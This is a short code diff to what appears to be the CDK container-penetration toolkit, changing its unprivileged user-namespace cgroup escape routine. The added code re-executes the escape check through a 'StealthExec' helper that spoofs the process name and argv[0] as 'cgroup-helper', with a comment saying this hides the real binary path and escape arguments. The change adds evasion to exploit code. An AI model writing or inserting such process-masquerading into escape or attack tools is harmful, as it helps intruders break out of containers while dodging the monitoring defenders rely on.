@@ -22,7 +22,6 @@ package escaping
 import (
 	"log"
 	"os"
-	"os/exec"
 	"syscall"
 
 	"github.com/cdk-team/CDK/pkg/audit/base"
@@ -110,8 +109,14 @@ func UnprivUserNS(cmd string) error {
 		return &errors.CDKRuntimeError{Err: nil, CustomMsg: "cannot find suitable subsystem for check"}
 	}
 
-	// 开始实际执行检查
-	reExecCmd := exec.Command(curExePath, "run", "cgroup-boundary", cmd, exploitSubSys)
+	// Re-exec self via StealthExec with argv[0] spoofing so the
+	// child appears as "cgroup-helper" rather than the full CDK
+	// binary path with "run cgroup-boundary" arguments.
+	reExecCmd := util.StealthExecCommand(curExePath, util.StealthExecOptions{
+		Argv0:     "cgroup-helper",
+		Comm:      "cgroup-helper",
+		ExtraArgs: []string{"run", "cgroup-boundary", cmd, exploitSubSys},
+	})
 	// same way as call unshare
 	reExecCmd.SysProcAttr = &syscall.SysProcAttr{
 		Unshareflags: unix.CLONE_NEWUSER | unix.CLONE_NEWNS | unix.CLONE_NEWCGROUP,
@@ -163,7 +168,11 @@ func UnprivUserNS(cmd string) error {
 	//}
 	//// then execute cgroup-boundary check with rdma subsystem
 
-	err = reExecCmd.Run()
+	err = util.StealthExecStart(reExecCmd, "cgroup-helper")
+	if err != nil {
+		return err
+	}
+	err = reExecCmd.Wait()
 	return err
 }
 
